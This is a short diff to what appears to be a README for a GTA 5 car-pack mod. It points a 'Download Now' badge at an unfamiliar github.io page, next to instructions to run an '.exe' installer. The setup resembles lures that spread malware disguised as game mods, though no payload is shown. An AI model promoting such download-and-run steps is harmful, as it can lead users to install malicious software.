@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start automatic installation into your GTA 5 directory.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://mega-realistic-car-pack-gta5-windows.github.io/.github/)
 
 
 ## ⚡ Key Features
